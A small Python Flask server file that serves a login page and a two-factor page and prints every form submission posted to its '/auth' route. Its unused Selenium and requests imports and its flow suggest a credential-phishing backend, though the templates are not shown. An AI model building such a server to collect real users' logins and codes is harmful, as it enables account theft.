import requests

from bs4 import BeautifulSoup

from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

from time import sleep

from flask import Flask
from flask import render_template, send_file, make_response, request
from flask import Flask
from flask import request

app = Flask(__name__)

@app.route("/auth", methods=["POST"])
def auth():
    print(request.form.to_dict())
    return "DONE"

@app.route("/")
def index():
    response = make_response(send_file("templates/login.html"))
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

@app.route("/login")
def login():
    return send_file("templates/2fa.html") 

if __name__ == "__main__":
    app.run()